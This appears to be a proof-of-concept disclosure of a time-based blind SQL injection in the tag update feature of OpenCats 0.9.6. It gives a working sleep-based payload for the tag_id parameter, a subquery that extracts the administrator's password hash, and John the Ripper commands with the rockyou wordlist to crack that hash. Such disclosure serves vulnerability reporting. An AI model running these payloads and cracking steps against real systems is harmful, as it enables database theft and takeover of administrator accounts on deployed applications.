# SQL injection vulnerability in OpenCats 'Tag' update functionality.

OpenCats version 0.9.6 PHP7.2 suffers from SQL injection vulnerability. This allows attackers control over the application's database.

User has control over tag_id variable, which allows SQL injection in UPDATE statement via time-based/blind techniques.

Application builds the following query:  
`UPDATE tag SET title = 'Title', description = 'Description' WHERE tag_id = XXX AND site_id = 1;`

User has control over XXX part.  

`1337 OR 1337=(select IF(substr(database(),1,1)='a',(select sleep(3)), (select sleep(1)))))`  

With this payload, application will sleep for 3 seconds for every entry inside original table if the database() query result starts with 'a', otherwise
it will sleep for one second.

With this time-based blind technique, attacker is able to exfiltrate any information from the database by querying many YES/NO questions 
to the database and intelligently measuring response times.

# POC
This proof of concept exfiltrates administrator user's password hash:   
`(select password from user where user_id=1)`

![PoC](https://user-images.githubusercontent.com/57464251/193683971-60bceb48-21fe-49fb-8a1d-d522383b8ec0.png)

### Bonus, let's crack the hash
`echo "21232f297a57a5a743894a0e4a801fc3" > hash.txt`  
`john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt`  

![crack](https://user-images.githubusercontent.com/57464251/193689052-cff2b570-87d5-452d-b2d5-be9f0c80df9f.png)
